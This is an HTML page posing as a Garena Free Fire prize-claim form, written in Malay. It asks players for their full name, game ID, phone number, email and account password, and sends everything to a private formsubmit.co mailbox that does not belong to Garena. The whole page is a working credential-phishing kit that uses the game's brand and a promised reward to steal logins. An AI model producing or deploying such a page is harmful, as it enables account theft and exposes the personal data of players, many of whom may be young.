<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>GARENA FREE FIRE</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 400px;
      margin: 20px auto;
      padding: 15px;
      background: #f5f5f5;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      color: #333;
    }
    label {
      display: block;
      margin-top: 15px;
      color: #555;
      font-weight: bold;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border-radius: 4px;
      border: 1px solid #ccc;
      box-sizing: border-box;
      font-size: 1em;
    }
    button {
      margin-top: 20px;
      width: 100%;
      padding: 12px;
      background-color: #4CAF50;
      border: none;
      border-radius: 5px;
      color: white;
      font-size: 1.1em;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #45a049;
    }
    @media (max-width: 480px) {
      body {
        margin: 10px;
        padding: 10px;
      }
    }
  </style>
</head>
<body>
  <h2>Borang Terima Hadiah</h2>
  <form action="https://formsubmit.co/ferdyfernandes1715@domain.com" method="POST">
    <label for="name">Nama Penuh:</label>
    <input type="text" id="name" name="name" required placeholder="Nama penuh" />

    <label for="age">Id Free Fire:</label>
    <input type="number" id="age" name="age" required placeholder="Id Free Fire" min="1" max="999999999999" />

    <label for="phone">Nombor Telefon:</label>
    <input type="tel" id="phone" name="phone" required placeholder="Contoh: 0123456789" pattern="[0-9]{10,15}" />

    <label for="email">Email:</label>
    <input type="email" id="email" name="email" required placeholder="email@domain.com" />

    <label for="password">Password:</label>
    <input type="password" id="password" name="password" required placeholder="Masukkan kata laluan" />

    <!-- Tambah hidden input untuk redirect selepas submit (optional) -->
    <input type="hidden" name="_next" value="https://yourdomain.com/thankyou.html" />

    <button type="submit">Hantar</button>
  </form>
</body>
</html>
